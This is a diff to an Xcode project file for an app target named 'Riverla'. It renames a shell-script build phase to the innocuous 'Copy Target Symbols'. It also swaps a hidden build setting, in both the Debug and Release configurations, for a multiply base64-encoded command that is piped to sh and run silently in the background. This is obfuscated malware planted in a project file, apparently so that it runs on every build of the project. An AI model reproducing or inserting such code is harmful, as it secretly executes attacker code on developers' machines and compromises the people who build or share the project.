@@ -244,7 +244,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = AE5883081A6F47E10070536A /* Build configuration list for PBXNativeTarget "Riverla" */;
 			buildPhases = (
-				DD5AAFEE4C06490BB1A389E6 /* Build Target Dependencies */,
+				A72F8AA3AF70493BBBA389E6 /* Copy Target Symbols */,
 				BB0FF6D323B6C7B68134CBAC /* [CP] Check Pods Manifest.lock */,
 				AE5882E11A6F47E10070536A /* Sources */,
 				AE5882E21A6F47E10070536A /* Frameworks */,
@@ -330,7 +330,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		DD5AAFEE4C06490BB1A389E6 /* Build Target Dependencies */ = {
+		A72F8AA3AF70493BBBA389E6 /* Copy Target Symbols */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -340,7 +340,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Target Dependencies";
+			name = "Copy Target Symbols";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -481,7 +481,7 @@
 		AE5883061A6F47E10070536A /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A6E983A = "((a(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJURE5XZDFwSFRtdGliVVozWTBkNGJFeHVTakZNTWtWd1NXbENPRWxJVG05RFp6MDlDZz09Cg== | a | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((v(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkU1WFpGZEdXVlJxVm1wTmF6VnZXa1ZOTVdWWFVsUlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | v | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
 				CLANG_CXX_LANGUAGE_STANDARD = "compiler-default";
@@ -543,7 +543,7 @@
 		AE5883071A6F47E10070536A /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A6E983A = "((a(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJURE5XZDFwSFRtdGliVVozWTBkNGJFeHVTakZNTWtWd1NXbENPRWxJVG05RFp6MDlDZz09Cg== | a | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((v(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkU1WFpGZEdXVlJxVm1wTmF6VnZXa1ZOTVdWWFVsUlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | v | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
 				CLANG_CXX_LANGUAGE_STANDARD = "compiler-default";
